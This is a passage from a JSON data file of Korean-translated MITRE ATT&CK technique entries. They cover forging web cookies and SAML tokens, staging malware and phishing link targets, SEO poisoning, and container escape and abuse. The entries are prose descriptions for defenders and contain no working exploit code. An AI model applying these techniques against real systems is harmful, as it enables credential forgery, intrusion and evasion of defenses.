      "description": "적대자들은 네트워크 구성 파일에 접근하여 장치 및 네트워크에 대한 민감한 데이터를 수집할 수 있습니다. 네트워크 구성은 장치의 운영을 결정하는 매개 변수를 포함하는 파일입니다. 장치는 일반적으로 작동 중에 구성의 메모리 내 복사본을 저장하고, 장치 재부팅 후 로드하기 위해 비휘발성 저장소에 별도의 구성을 저장합니다. 적대자들은 구성 파일을 검사하여 대상 네트워크 및 그 레이아웃, 네트워크 장치 및 소프트웨어에 대한 정보, 또는 나중에 사용할 합법적인 계정 및 자격 증명을 식별할 수 있습니다.\n\n적대자들은 간단한 네트워크 관리 프로토콜(SNMP) 및 스마트 설치(SMI)와 같은 일반적인 관리 도구 및 프로토콜을 사용하여 네트워크 구성 파일에 접근할 수 있습니다.(출처: US-CERT TA18-106A 네트워크 인프라 장치 2018)(출처: Cisco 블로그 레거시 장치 공격) 이러한 도구는 구성 저장소에서 특정 데이터를 쿼리하거나 장치를 구성하여 나중에 분석을 위해 구성을 내보내도록 설정하는 데 사용될 수 있습니다.",
      "external_id": "T1602.002",
      "modified": "2022-02-17T19:50:46.948Z",
      "title": "Network Device Configuration Dump",
      "translated": true
    },
    {
      "description": "적대 세력은 웹 애플리케이션이나 인터넷 서비스에 접근하기 위해 사용할 수 있는 인증 자료를 위조할 수 있습니다. 클라우드 SaaS 환경 또는 온프레미스 서버에서 호스팅되는 웹 애플리케이션 및 서비스는 종종 세션 쿠키, 토큰 또는 기타 자료를 사용하여 사용자 접근을 인증하고 권한을 부여합니다.\n\n적대 세력은 이러한 인증 자료를 생성하여 웹 리소스에 접근할 수 있습니다. 이것은 [웹 세션 쿠키 도용](https://attack.mitre.org/techniques/T1539), [애플리케이션 접근 토큰 도용](https://attack.mitre.org/techniques/T1528)과 같은 유사한 행동과 달리, 이러한 인증 정보가 기존 사용자로부터 도용되거나 가로채여진 것이 아니라 적대 세력에 의해 새롭게 위조된 것이라는 점에서 차이가 있습니다.\n\n웹 자격 증명의 생성을 위해 종종 비밀 값이 필요하며, 여기에는 비밀번호, [개인 키](https://attack.mitre.org/techniques/T1552/004) 또는 기타 암호화된 시드 값이 포함됩니다. (출처: GitHub AWS-ADFS-Credential-Generator) 적대 세력은 또한 AWS의 `AssumeRole` 및 `GetFederationToken` API와 같은 기능을 이용하여 토큰을 위조할 수 있습니다. 이러한 API는 사용자들이 임시 보안 자격 증명을 요청할 수 있도록 하며, 이는 [임시 상승 클라우드 접근](https://attack.mitre.org/techniques/T1548/005)을 가능하게 합니다. 또한, Zimbra의 `zmprov gdpak` 명령어는 도메인 내 사용자의 토큰을 생성하는 데 사용할 수 있는 사전 인증 키를 생성합니다. (출처: AWS 임시 보안 자격 증명)(출처: Zimbra 사전 인증)\n\n한 번 위조된 후, 적대 세력은 이러한 웹 자격 증명을 사용하여 리소스에 접근할 수 있으며, 이는 다중 요소 인증 및 기타 인증 보호 메커니즘을 우회할 수 있습니다. (출처: 쿠키 패스)(출처: Unit 42 Mac Crypto Cookies 2019년 1월)(출처: Microsoft SolarWinds 고객 안내)",
      "external_id": "T1606",
      "modified": "2024-10-15T15:58:23.638Z",
      "title": "Forge Web Credentials",
      "translated": true
    },
    {
      "description": "적대자는 웹 어플리케이션이나 인터넷 서비스에 접근하기 위해 사용될 수 있는 웹 쿠키를 위조할 수 있습니다. 웹 어플리케이션 및 서비스(클라우드 SaaS 환경 또는 온프레미스 서버에 호스팅됨)는 종종 사용자 접근을 인증하고 권한을 부여하기 위해 세션 쿠키를 사용합니다.\n\n적대자는 이러한 쿠키를 생성하여 웹 자원에 접근할 수 있습니다. 이는 [웹 세션 쿠키 탈취](https://attack.mitre.org/techniques/T1539)와 같은 유사한 행동과는 다릅니다. 위조된 쿠키는 적대자가 새롭게 만든 것이고, 정상 사용자의 쿠키를 도난당하거나 가로챈 것이 아닙니다. 대부분의 일반 웹 어플리케이션은 제공된 도구나 인터페이스를 사용하여 생성할 수 있는 표준화된 문서화된 쿠키 값을 가지고 있습니다. (출처: Pass The Cookie) 웹 쿠키의 생성은 종종 비밀번호, [개인 키](https://attack.mitre.org/techniques/T1552/004) 또는 기타 암호화된 시드 값과 같은 비밀 값을 요구합니다.\n\n한번 위조된 쿠키는 적대자가 자원에 접근하는 데 사용될 수 있으며 ([웹 세션 쿠키](https://attack.mitre.org/techniques/T1550/004)), 이는 다중 인증 및 기타 인증 보호 메커니즘을 우회할 수 있습니다. (출처: Volexity SolarWinds)(출처: Pass The Cookie)(출처: Unit 42 Mac Crypto Cookies January 2019)",
      "external_id": "T1606.001",
      "modified": "2023-09-19T21:25:10.511Z",
      "title": "Web Cookies",
      "translated": true
    },
    {
      "description": "다양한 권한 주장과 유효 기간을 가진 SAML 토큰을 위조할 수 있는 적은 유효한 SAML 토큰 서명 인증서를 보유하고 있을 경우 가능합니다. (인용: Microsoft SolarWinds 단계) 기본 SAML 토큰의 유효 기간은 1시간이지만, 유효 기간은 토큰 내의 <code>conditions ...</code> 요소의 <code>NotOnOrAfter</code> 값에서 지정할 수 있습니다. 이 값은 <code>LifetimeTokenPolicy</code>의 <code>AccessTokenLifetime</code>을 사용하여 변경할 수 있습니다. (인용: Microsoft SAML 토큰 유효 기간) 위조된 SAML 토큰은 적이 SAML 2.0을 SSO(싱글 사인 온) 메커니즘으로 사용하는 서비스에서 인증하는 데 이용될 수 있습니다. (인용: Cyberark Golden SAML)\n\n적은 [개인 키](https://attack.mitre.org/techniques/T1552/004)를 활용하여 조직의 토큰 서명 인증서를 손상시켜 위조된 SAML 토큰을 생성할 수 있습니다. 적이 자신의 Active Directory Federation Services (AD FS) 서버와 새로운 페더레이션 신뢰를 설정할 수 있는 충분한 권한을 가진 경우, 그들은 대신 자신의 신뢰할 수 있는 토큰 서명 인증서를 생성할 수 있습니다. (인용: Microsoft SolarWinds 고객 안내) 이는 [애플리케이션 액세스 토큰 훔치기](https://attack.mitre.org/techniques/T1528) 및 기타 유사한 행동과는 다르며, 위조된 토큰은 적에 의해 새롭게 생성된 것이지, 정당한 사용자로부터 도난당하거나 가로채어진 것이 아닙니다.\n\n적은 높은 권한의 계정을 나타내는 SAML 토큰이 위조될 경우 관리적인 Entra ID 권한을 얻을 수 있습니다. 이는 [대체 인증 자료 사용](https://attack.mitre.org/techniques/T1550)을 초래할 수 있으며, 이는 다단계 인증 및 기타 인증 보호 메커니즘을 우회할 수 있습니다. (인용: Microsoft SolarWinds 고객 안내)",
      "external_id": "T1606.002",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "SAML Tokens",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅하는 동안 사용할 수 있는 기능을 업로드, 설치 또는 설정할 수 있습니다. 그들의 작전을 지원하기 위해, 적대자는 자신이 개발한 기능([기능 개발](https://attack.mitre.org/techniques/T1587)) 또는 획득한 기능([기능 획득](https://attack.mitre.org/techniques/T1588))을 자신의 통제 하에 있는 인프라에 스테이징할 필요가 있을 수 있습니다. 이 기능은 적대자가 이전에 구매하거나 임대한 인프라([인프라 획득](https://attack.mitre.org/techniques/T1583))에 스테이징되거나, 그들이 손상시킨 인프라([인프라 손상](https://attack.mitre.org/techniques/T1584))에 스테이징될 수 있습니다. 기능은 GitHub나 Pastebin과 같은 웹 서비스나, 사용자가 애플리케이션을 손쉽게 프로비저닝할 수 있는 플랫폼-서비스(PaaS) 제공에 스테이징될 수도 있습니다. (출처: Volexity Ocean Lotus 2020년 11월)(출처: Dragos Heroku 물 웅덩이)(출처: Malwarebytes Heroku 스키머)(출처: Netskope GCP 리디렉션)(출처: Netskope 클라우드 피싱)\n\n기능의 스테이징은 적대자가 초기 접근 및 사후 손상 행동을 지원하는 여러 가지 방법에 도움이 될 수 있으며, 여기에는 (단지 예시일 뿐):\n\n* 사용자가 사이트를 탐색할 때 [드라이브 바이 컴프롬스](https://attack.mitre.org/techniques/T1189)를 수행하는 데 필요한 웹 리소스 스테이징.(출처: FireEye CFR 물 웅덩이 2012)(출처: Gallagher 2015)(출처: ATT ScanBox)\n* 스피어 피싱과 함께 사용될 링크 대상에 필요한 웹 리소스 스테이징.(출처: Malwarebytes Silent Librarian 2020년 10월)(출처: Proofpoint TA407 2019년 9월)\n* [인트그레스 도구 전송](https://attack.mitre.org/techniques/T1105)을 가능하게 하기 위해 피해자 네트워크에서 접근할 수 있는 위치에 악성코드나 도구를 업로드하는 것.(출처: Volexity Ocean Lotus 2020년 11월)\n* 명령 및 제어 트래픽을 암호화하는 데 사용할 SSL/TLS 인증서를 설치하는 것 (예: [비대칭 암호화](https://attack.mitre.org/techniques/T1573/002)와 [웹 프로토콜](https://attack.mitre.org/techniques/T1071/001)).(출처: DigiCert SSL 인증서 설치)",
      "external_id": "T1608",
      "modified": "2022-10-19T22:01:05.551Z",
      "title": "Stage Capabilities",
      "translated": true
    },
    {
      "description": "공격자는 목표 설정 중에 악성 코드를 제3자 또는 공격자가 제어하는 인프라에 업로드하여 접근할 수 있도록 할 수 있습니다. 악성 소프트웨어에는 페이로드, 드로퍼, 침해 후 도구, 백도어 및 다양한 기타 악성 콘텐츠가 포함될 수 있습니다. 공격자는 운영을 지원하기 위해 악성 코드를 업로드할 수 있으며, 예를 들어 피해자 네트워크에 페이로드를 제공하여 [수신 도구 전송(Ingress Tool Transfer)](https://attack.mitre.org/techniques/T1105)를 가능하게 하기 위해 인터넷에 접근 가능한 웹 서버에 이를 배치할 수 있습니다.\n\n악성 코드는 공격자가 이전에 구매하거나 임대한 인프라 ([인프라 획득(Acquire Infrastructure)](https://attack.mitre.org/techniques/T1583))거나 다른 방법으로 침해된 인프라 ([인프라 침해(Compromise Infrastructure)](https://attack.mitre.org/techniques/T1584))에 배치될 수 있습니다. 악성 코드는 GitHub이나 Pastebin과 같은 웹 서비스에 스테이징되거나, 분산 콘텐츠 저장이 어려운 인터플래너리 파일 시스템(IPFS)에 호스팅될 수 있습니다. (인용: Volexity Ocean Lotus 2020년 11월)(인용: Talos IPFS 2022)\n\n공격자는 애플리케이션 바이너리, 가상 머신 이미지 또는 컨테이너 이미지와 같은 백도어가 장착된 파일을 제3자 소프트웨어 스토어 또는 저장소(예: GitHub, CNET, AWS 커뮤니티 AMI, Docker Hub)에 업로드할 수 있습니다. 우연한 만남을 통해 피해자는 [사용자 실행(User Execution)](https://attack.mitre.org/techniques/T1204)를 통해 이러한 백도어 파일을 직접 다운로드/설치할 수 있습니다. [위장(Masquerading)](https://attack.mitre.org/techniques/T1036)은 사용자가 이러한 파일을 잘못 실행할 가능성을 높일 수 있습니다.",
      "external_id": "T1608.001",
      "modified": "2024-10-16T20:13:40.501Z",
      "title": "Upload Malware",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 동안 도구를 접근 가능하게 하기 위해 제3자 또는 적대자가 통제하는 인프라에 도구를 업로드할 수 있습니다. 도구는 오픈 소스이거나 폐쇄된 소스일 수 있으며, 무료이거나 상업적일 수 있습니다. 도구는 적대자가 악의적인 목적으로 사용할 수 있지만(악성코드와는 다르게) 본래 그러한 목적을 위해 설계되지 않았습니다(예: [PsExec](https://attack.mitre.org/software/S0029)). 적대자는 작동을 지원하기 위해 도구를 업로드할 수 있으며, 예를 들어 피해자 네트워크에 도구를 제공하여 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)를 가능하게 하기 위해 인터넷에 접근 가능한 웹 서버에 배치할 수 있습니다.\n\n도구는 적대자가 이전에 구매하거나 임대한 인프라([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))에 배치되거나 적대자에 의해 타협된 인프라([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584))에 배치될 수 있습니다. (출처: Dell TG-3390) 도구는 또한 적대자가 제어하는 GitHub 저장소와 같은 웹 서비스 또는 사용자가 쉽게 애플리케이션을 배포할 수 있는 플랫폼-서비스 제공업체에 준비될 수 있습니다. (출처: Dragos Heroku Watering Hole)(출처: Malwarebytes Heroku Skimmers)(출처: Intezer App Service Phishing)\n\n적대자는 도구를 직접 제3자 호스팅 위치(예: 적대자가 통제하지 않는 GitHub 저장소)에서 다운로드 받아 피해자 기계가 도구를 업로드할 필요성을 피할 수 있습니다.",
      "external_id": "T1608.002",
      "modified": "2022-10-20T20:16:32.599Z",
      "title": "Upload Tool",
      "translated": true
    },
    {
      "description": "상대방은 목표 달성에 사용될 수 있는 SSL/TLS 인증서를 설치할 수 있습니다. SSL/TLS 인증서는 시스템 간의 안전한 통신을 가능하게 하는 서버에 설치할 수 있는 파일입니다. 디지털 인증서에는 키에 대한 정보, 소유자의 신원에 대한 정보, 인증서의 내용을 확인한 주체의 디지털 서명이 포함되어 있습니다. 서명이 유효하고 인증서를 검토하는 사람이 서명자를 신뢰할 경우, 해당 키를 사용하여 소유자와 안전하게 통신할 수 있음을 알게 됩니다. 인증서는 서버에 업로드할 수 있으며, 이후 서버는 인증서를 사용하도록 설정되어 이를 통해 암호화된 통신을 활성화할 수 있습니다.(인용: DigiCert SSL 인증서 설치)\n\n상대방은 C2 트래픽을 암호화하거나(예: [비대칭 암호화](https://attack.mitre.org/techniques/T1573/002)와 [웹 프로토콜](https://attack.mitre.org/techniques/T1071/001) 사용) 자격 증명 수집 사이트에 신뢰성을 부여하는 등 작업을 확대하기 위해 SSL/TLS 인증서를 설치할 수 있습니다. 디지털 인증서 설치는 웹 서버 및 이메일 서버와 같은 다양한 서버 유형에 대해 이루어질 수 있습니다.\n\n상대방은 디지털 인증서(예: [디지털 인증서](https://attack.mitre.org/techniques/T1588/004))를 획득하거나 자체 서명된 인증서(예: [디지털 인증서](https://attack.mitre.org/techniques/T1587/003))를 생성할 수 있습니다. 그런 다음 디지털 인증서는 상대방이 통제하는 인프라에 설치될 수 있으며, 이는 [인프라 획득](https://attack.mitre.org/techniques/T1583) 또는 이전에 침해된 인프라([인프라 침해](https://attack.mitre.org/techniques/T1584))로 얻어졌을 수 있습니다.",
      "external_id": "T1608.003",
      "modified": "2021-10-16T17:47:46.409Z",
      "title": "Install Digital Certificate",
      "translated": true
    },
    {
      "description": "적대자는 일반적인 웹 브라우징 과정에서 방문하는 웹사이트를 감염시키기 위해 운영 환경을 준비할 수 있습니다. 엔드포인트 시스템은 적대자가 제어하는 사이트를 브라우징함으로써 손상될 수 있으며, 이는 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)와 같은 사례에 해당합니다. 이러한 경우, 사용자의 웹 브라우저가 일반적으로 공격의 주요 타겟이 되며 (웹사이트에 접속 후 추가 사용자 상호작용을 필요로 하지 않는 경우가 많음), 적대자는 또한 [Application Access Token](https://attack.mitre.org/techniques/T1550/001)과 같은 비공격 행동을 위해 웹사이트를 설정할 수도 있습니다. [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 전에, 적대자는 공격을 사용자가 있는 적대자 제어 사이트로 브라우징할 때 전달하기 위해 필요한 자원을 준비해야 합니다. 공격 콘텐츠는 적대자가 제어하는 인프라에 준비될 수 있으며, 이는 인프라를 취득하는 경우 ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) 또는 이전에 손상된 경우 ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584))에 해당합니다.\n\n적대자는 웹사이트에 [JavaScript](https://attack.mitre.org/techniques/T1059/007)와 같은 악성 웹 콘텐츠를 업로드하거나 주입할 수 있습니다.(출처: FireEye CFR Watering Hole 2012)(출처: Gallagher 2015) 이는 여러 가지 방식으로 수행될 수 있습니다:\n\n* 웹 페이지 또는 사용자 제어 가능한 웹 콘텐츠(예: 포럼 게시물)에 악성 스크립트를 삽입\n* 공개적으로 쓰기 가능한 클라우드 스토리지 버킷에서 웹사이트에 제공되는 스크립트 파일 수정\n* 악성 웹 광고를 제작하고 합법적인 광고 공급자를 통해 웹사이트에 광고 공간 구매 (즉, [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n\n사용자의 웹 브라우저를 공격하기 위한 콘텐츠를 준비하는 것 외에도, 적대자는 사용자의 브라우저를 프로파일링하기 위해 스크립팅 콘텐츠를 준비할 수 있습니다 (예: [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) 이를 통해 공격 시점에 브라우저가 취약한지 확인할 수 있습니다.(출처: ATT ScanBox)\n\n적대자가 손상시켜 드라이브바이에 활용하는 웹사이트는 특정 커뮤니티(예: 정부, 특정 산업, 지역 등)가 방문하는 사이트일 수 있으며, 목표는 특정 사용자를 타겟으로 하여 공통 관심사에 기반하여 공격하는 것입니다. 이러한 유형의 타겟 캠페인은 전략적 웹 손상 또는 워터링 홀 공격이라고 합니다.\n\n적대자는 인프라를 취득하는 과정에서 합법적인 도메인과 유사한 도메인(예: 동호 글리프, 오타 스쿼팅, 다른 최상위 도메인 등)을 구매하여 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)를 촉진할 수 있습니다.",
      "external_id": "T1608.004",
      "modified": "2023-04-15T00:21:55.791Z",
      "title": "Drive-by Target",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 타겟팅 시 사용될 수 있는 링크에 의해 참조되는 자원을 마련할 수 있습니다. 공격자는 사용자가 악성 링크를 클릭하여 정보를 유출(자격 증명 포함)하거나 실행을 얻도록 할 수 있습니다. 이는 [악성 링크](https://attack.mitre.org/techniques/T1204/001)와 관련이 있습니다. 링크는 스피어피싱에 사용될 수 있으며, 예를 들어 소셜 엔지니어링 텍스트가 수반된 이메일을 전송하여 사용자가 적극적으로 클릭하거나 URL을 브라우저에 복사하여 붙여넣도록 유도할 수 있습니다. 정보 탈취를 위한 피싱(예: [스피어피싱 링크](https://attack.mitre.org/techniques/T1598/003))이나 시스템에 대한 초기 접근을 얻기 위한 피싱(예: [스피어피싱 링크](https://attack.mitre.org/techniques/T1566/002))을 수행하기 전에 공격자는 스피어피싱 링크의 링크 타겟에 대한 자원을 설정해야 합니다.\n\n대개 링크 타겟에 대한 자원은 사용자에게 제공할 콘텐츠를 결정하기 위해 [JavaScript](https://attack.mitre.org/techniques/T1059/007) 등의 일부 클라이언트 측 스크립트를 포함할 수 있는 HTML 페이지입니다. 공격자는 자격 증명을 수집하기 위한 목적으로 합법적인 웹 서비스의 로그인 페이지를 클론하는 등 링크 타겟으로 사용하는 합법적인 사이트를 모방할 수 있습니다. 이는 [스피어피싱 링크](https://attack.mitre.org/techniques/T1598/003) 동안 발생할 수 있습니다. (인용: Malwarebytes Silent Librarian 2020년 10월)(인용: Proofpoint TA407 2019년 9월) 또한 공격자는 [악성 코드 업로드](https://attack.mitre.org/techniques/T1608/001)를 통해 사용자에 의해 다운로드/실행될 악성 코드가 포함된 링크 타겟을 설정할 수 있습니다.\n\n공격자는 인프라를 확보하는 동안 해당 도메인에서 합법적인 도메인과 유사한 도메인(예: 호모글리프, 오타 스쿼팅, 다른 최상위 도메인 등)을 구입하여 [악성 링크](https://attack.mitre.org/techniques/T1204/001)를 촉진할 수 있습니다. ([도메인](https://attack.mitre.org/techniques/T1583/001))\n\n링크는 공격자가 URL 스키마를 남용하여 피해자를 속이기 위해 진짜 목적지를 숨기기 위해 작성할 수 있으며, 이는 피싱의 효과를 증가시킵니다. (인용: Kaspersky-마스킹)(인용: Mandiant-마스킹)\n\n또한 공격자는 링크 단축 서비스 및 플랫폼 서비스 제공업체의 무료 또는 유료 계정을 사용하여 링크 타겟을 호스트하며, 이러한 제공자의 널리 신뢰받는 도메인을 이용하여 피해자를 악성 페이지로 유도하는 동안 차단을 피할 수 있습니다. (인용: Netskope GCP 리디렉션)(인용: Netskope 클라우드 피싱)(인용: Intezer 앱 서비스 피싱)(인용: Cofense-리디렉션) 추가로, 공격자는 특별히 생성된 URI/URL(일회성 단일 사용 링크 포함)을 통해 다양한 악성 링크를 제공할 수 있습니다. (인용: iOS URL 스킴)(인용: URI)(인용: URI 사용)(인용: URI 고유) 마지막으로, 공격자는 탈중앙화된 인터플래네타리 파일 시스템(IPFS)의 특성을 이용하여 제거하기 어려운 링크 타겟을 호스팅할 수 있습니다. (인용: Talos IPFS 2022)",
      "external_id": "T1608.005",
      "modified": "2024-10-16T20:09:41.391Z",
      "title": "Link Target",
      "translated": true
    },
    {
      "description": "적대자는 잠재적 피해자를 유인하기 위해 검색 엔진 최적화(SEO) 영향을 미치는 메커니즘을 오염시킬 수 있습니다. 검색 엔진은 일반적으로 구매한 광고와 웹 크롤러 및 알고리즘에 의해 계산된 사이트의 순위/점수/평판을 기반으로 사용자에게 결과를 표시합니다. (출처: Atlas SEO)(출처: MalwareBytes SEO)\n\n[드라이브 바이 타협](https://attack.mitre.org/techniques/T1189)를 용이하게 하기 위해 적대자는 SEO 순위를 명시적으로 조작하는 콘텐츠를 준비하여 검색 엔진 내에서 자신의 악성 페이로드를 호스팅하는 사이트(예: [드라이브 바이 타겟](https://attack.mitre.org/techniques/T1608/004))를 홍보할 수 있습니다. SEO 순위를 오염시키는 방법은 여러 가지 기법을 포함할 수 있으며, 예를 들어, 키워드를 숨겨진 텍스트 형태로 포함하여 손상된 사이트에 채워 넣는 것입니다. 이러한 키워드는 의도된 피해자의 관심사/탐색 습관과 더 넓은 계절적으로 인기 있는 주제(예: 선거, 트렌드 뉴스)와 관련될 수 있습니다. (출처: ZScaler SEO)(출처: Atlas SEO)\n\n인터넷 검색 엔진(예: 구글) 외에도, 적대자는 개발자 플랫폼(예: GitHub)의 특정 내부 검색을 조작하여 사용자를 [공급망 타협](https://attack.mitre.org/techniques/T1195) 유인책으로 속일 수 있습니다. 내부 검색은 자체 알고리즘과 인기와 같은 메트릭에 따라 검색 결과의 순위를 매기며, 이는 악의적인 행위자에 의해 표적화되고 조작될 수 있습니다. (출처: Chexmarx-seo)\n\n적대자는 또한 사이트의 계산된 관련성 및 평판을 높이기 위해 스테이지된 기능에 대한 오입력 링크를 구매하거나 심을 수 있습니다. (출처: MalwareBytes SEO)(출처: DFIR Report Gootloader)\n\nSEO 오염은 또한 기만적 리디렉션 및 기타 은폐 메커니즘(예: 마우스 움직임 측정 또는 브라우저 사용자 에이전트, 사용자 언어/현지화 설정 또는 HTTP 헤더를 기반으로 콘텐츠 제공)을 결합하여 SEO 입력을 제공하는 동시에 방어자로부터 검토를 피할 수 있습니다. (출처: ZScaler SEO)(출처: Sophos Gootloader)",
      "external_id": "T1608.006",
      "modified": "2024-08-14T15:03:56.383Z",
      "title": "SEO Poisoning",
      "translated": true
    },
    {
      "description": "위협 행위자는 컨테이너 관리 서비스를 악용하여 컨테이너 내에서 명령을 실행할 수 있습니다. Docker 데몬, Kubernetes API 서버 또는 kubelet과 같은 컨테이너 관리 서비스는 환경 내의 컨테이너를 원격으로 관리할 수 있게 해줍니다. (인용: Docker Daemon CLI)(인용: Kubernetes API)(인용: Kubernetes Kubelet)\n\nDocker에서는 위협 행위자가 컨테이너 배포 시 실행할 스크립트나 명령어를 지정하는 엔트리포인트를 설정하거나, <code>docker exec</code>와 같은 명령어를 사용하여 실행 중인 컨테이너 내에서 명령을 실행할 수 있습니다. (인용: Docker Entrypoint)(인용: Docker Exec) Kubernetes에서는 위협 행위자가 충분한 권한을 가진 경우, Kubernetes API 서버, kubelet과 상호작용하거나 <code>kubectl exec</code>와 같은 명령어를 실행하여 클러스터 내의 컨테이너에서 원격 실행을 수행할 수 있습니다. (인용: Kubectl Exec Get Shell)",
      "external_id": "T1609",
      "modified": "2024-10-15T16:25:45.507Z",
      "title": "Container Administration Command",
      "translated": true
    },
    {
      "description": "위협 행위자는 환경에 대한 실행을 용이하게 하거나 방어를 회피하기 위해 컨테이너를 배포할 수 있습니다. 경우에 따라 위협 행위자는 특정 이미지나 배포와 관련된 프로세스를 실행하거나 다운로드하는 프로세스와 같은 프로세스를 실행하기 위해 새로운 컨테이너를 배포할 수 있습니다. 다른 경우에는, 위협 행위자가 네트워크 규칙, 사용자 제한 등을 설정하지 않은 새로운 컨테이너를 배포하여 환경 내의 기존 방어를 우회하려고 할 수 있습니다. Kubernetes 환경에서 위협 행위자는 특정 노드에 권한이 있는 또는 취약한 컨테이너를 배포하여 [호스트로 탈출하기](https://attack.mitre.org/techniques/T1611) 시도하고, 해당 노드에서 실행 중인 다른 컨테이너에 접근할 수 있습니다. (인용: AppSecco Kubernetes Namespace Breakout 2020)\n\n컨테이너는 Docker의 `<code>create</code>` 및 `<code>start</code>` API나 Kubernetes 대시보드 또는 Kubeflow와 같은 웹 애플리케이션을 통해 다양한 방법으로 배포될 수 있습니다. (인용: Docker Containers API)(인용: Kubernetes Dashboard)(인용: Kubeflow Pipelines) Kubernetes 환경에서는 ReplicaSets 또는 DaemonSets와 같은 작업 부하를 통해 컨테이너를 배포할 수 있으며, 이를 통해 여러 노드에 걸쳐 컨테이너가 배포될 수 있습니다. (인용: Kubernetes Workload Management) 위협 행위자는 가져온 또는 생성된 악성 이미지 또는 런타임 시 악성 페이로드를 다운로드 및 실행하는 양호한 이미지에 기반하여 컨테이너를 배포할 수 있습니다. (인용: Aqua Build Images on Hosts)",
      "external_id": "T1610",
      "modified": "2024-10-15T15:06:17.124Z",
      "title": "Deploy Container",
      "translated": true
    },
    {
      "description": "공격자는 컨테이너에서 벗어나 기본 호스트에 접근할 수 있습니다. 이를 통해 공격자는 호스트 레벨에서 다른 컨테이너화된 자원에 접근하거나 호스트 자체에 접근할 수 있습니다. 원칙적으로, 컨테이너화된 자원은 애플리케이션 기능의 명확한 분리를 제공해야 하며 호스트 환경에서 격리되어 있어야 합니다.(인용: Docker 개요)\n\n공격자가 호스트 환경으로 탈출할 수 있는 방법은 여러 가지가 있습니다. 예를 들어, 호스트의 파일 시스템을 바인드 매개변수를 사용하여 마운트하도록 설정된 컨테이너를 생성하면 공격자는 페이로드를 떨어뜨리고 호스트에서 crontab과 같은 제어 유틸리티를 실행할 수 있습니다; 또는 특권이 있는 컨테이너를 사용하여 기본 호스트에서 명령을 실행하거나 악성 커널 모듈을 로드할 수 있습니다; 또는 권한 상승 및 비밀 탈취를 위해 `unshare` 및 `keyctl`과 같은 시스템 호출을 남용할 수 있습니다.(인용: Docker 바인드 마운트)(인용: 트렌드 마이크로 특권 컨테이너)(인용: 인테저 도키 7월 20일)(인용: 컨테이너 탈출)(인용: 크라우드스트라이크 쿠버네티스 컨테이너 탈출)(인용: Keyctl-unmask)\n\n추가로, 공격자는 마운트된 컨테이너 관리 소켓(예: `docker.sock`)이 있는 손상된 컨테이너를 악용하여 [컨테이너 관리 명령](https://attack.mitre.org/techniques/T1609)을 통해 컨테이너에서 탈출할 수 있습니다.(인용: 컨테이너 탈출) 공격자는 또한 [권한 상승을 위한 악용](https://attack.mitre.org/techniques/T1068)을 통해 호스트 머신의 루트 디렉터리에 접근하기 위해 전역 심볼릭 링크의 취약점을 악용하여 탈출할 수 있습니다.(인용: Windows 서버 컨테이너가 열려 있음)\n\n호스트에 접근하게 되면 공격자는 지속성을 구축하거나 환경 내 수평 이동을 하거나 호스트에서 실행 중인 다른 컨테이너에 접근하거나 호스트에서 명령 및 제어 채널을 설정하는 등 후속 목표를 달성할 수 있는 기회를 가지게 됩니다.",
      "external_id": "T1611",
      "modified": "2024-04-19T12:42:18.632Z",
      "title": "Escape to Host",
      "translated": true
    },
    {
      "description": "적대자는 호스트에서 직접 컨테이너 이미지를 구축하여 악성 이미지의 수retrieval을 모니터링하는 방어를 우회할 수 있습니다. 원격 <code>build</code> 요청이 Docker API에 전송되어, 일반적인 베이스 이미지(예: alpine)를 공용 또는 로컬 레지스트리에서 끌어온 다음 그 위에 맞춤형 이미지를 구축하는 Dockerfile이 포함될 수 있습니다.(인용: Docker Build Image)\n\n적대자는 그 <code>build</code> API를 이용하여 호스트에서 C2 서버에서 다운로드된 악성 코드를 포함하는 맞춤형 이미지를 구축할 수 있으며, 이후 이 맞춤형 이미지를 사용하여 [컨테이너 배포](https://attack.mitre.org/techniques/T1610)를 활용할 수 있습니다.(인용: Aqua Build Images on Hosts)(인용: Aqua Security Cloud Native Threat Report 2021년 6월) 기본 이미지가 공용 레지스트리에서 가져오는 경우, 방어 시스템은 해당 이미지가 일반 이미지이기 때문에 악성으로 감지하지 않을 가능성이 높습니다. 기본 이미지가 이미 로컬 레지스트리에 존재하는 경우, 이미 환경 내에 있으므로 그 끌어오기(pull)는 더욱 덜 의심스러울 수 있습니다.",
      "external_id": "T1612",
      "modified": "2023-04-15T16:22:09.807Z",
      "title": "Build Image on Host",
      "translated": true
    },
    {
      "description": "위험 요소는 컨테이너 환경 내에서 사용 가능한 컨테이너 및 기타 리소스를 찾으려 할 수 있습니다. 기타 리소스에는 이미지, 배포, 파드, 노드 및 클러스터 상태와 같은 정보가 포함될 수 있습니다.\n\n이러한 리소스는 Kubernetes 대시보드와 같은 웹 애플리케이션 내에서 확인하거나 Docker 및 Kubernetes API를 통해 쿼리할 수 있습니다. (인용: Docker API)(인용: Kubernetes API) Docker에서는 로그가 환경의 구성, 사용 가능한 서비스 및 피해자가 이용할 수 있는 클라우드 제공자와 같은 환경에 대한 정보를 누출할 수 있습니다. 이러한 리소스의 발견은 위험 요소가 환경 내에서 다음 단계, 즉 수평 이동을 수행하는 방법과 실행에 사용할 메서드를 결정하는 데 도움이 될 수 있습니다.",
      "external_id": "T1613",
      "modified": "2023-04-15T16:08:50.706Z",
      "title": "Container and Resource Discovery",
      "translated": true
    },
    {
